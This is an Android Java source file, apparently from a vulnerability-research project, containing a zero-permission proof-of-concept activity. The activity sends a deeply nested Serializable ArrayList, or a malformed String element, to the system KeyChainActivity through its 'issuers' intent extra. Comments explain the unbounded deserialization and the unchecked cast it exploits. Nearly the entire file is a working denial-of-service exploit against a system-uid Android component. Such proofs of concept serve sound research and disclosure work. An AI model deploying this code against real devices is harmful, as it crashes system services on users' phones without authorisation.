package com.vrp.zeroperm;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.os.Bundle;
import android.util.Log;

import java.util.ArrayList;

// Class 19 (parcel_serialization) probe: KeyChainActivity.chooseCertificate() does
// ArrayList arrayList = (ArrayList) getIntent().getSerializableExtra("issuers");
// using the UNBOUNDED getSerializableExtra(String) overload — Android deserializes
// the full attacker-controlled object graph via ObjectInputStream.readObject()
// BEFORE the app-level (ArrayList) cast ever runs. This tests whether a deeply
// nested Serializable graph can exhaust the stack of the receiving (system-uid)
// process during that deserialization.
public class KeychainDeserDosActivity extends Activity {
    private static final String T = "KC_DESER_DOS";

    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);
        Log.w(T, "=== KeyChainActivity 'issuers' Serializable DoS probe ===");
        Log.w(T, "UID=" + android.os.Process.myUid() + " (ZERO permissions)");

        boolean minimal = getIntent().getBooleanExtra("minimal", false);
        ArrayList<Object> root = new ArrayList<>();
        if (minimal) {
            // Single malformed element: KeyChainActivity$CertificateParametersFilter
            // blindly casts every "issuers" list element to byte[] with no type check.
            root.add("not-a-byte-array");
            Log.w(T, "Minimal payload: single non-byte[] String element");
        } else {
            int depth = getIntent().getIntExtra("depth", 5000);
            Log.w(T, "Building nested ArrayList graph, depth=" + depth);
            ArrayList<Object> cur = root;
            for (int i = 0; i < depth; i++) {
                ArrayList<Object> next = new ArrayList<>();
                cur.add(next);
                cur = next;
            }
        }
        Log.w(T, "Sending to com.android.keychain.CHOOSER as 'issuers' extra...");

        try {
            Intent intent = new Intent("com.android.keychain.CHOOSER");
            intent.setComponent(new ComponentName("com.android.keychain", "com.android.keychain.KeyChainActivity"));
            intent.putExtra("issuers", root);
            intent.putExtra("key_types", new String[0]);
            startActivity(intent);
            Log.w(T, "startActivity() returned normally");
        } catch (Throwable t) {
            Log.w(T, "startActivity() threw: " + t);
        }
        finish();
    }
}
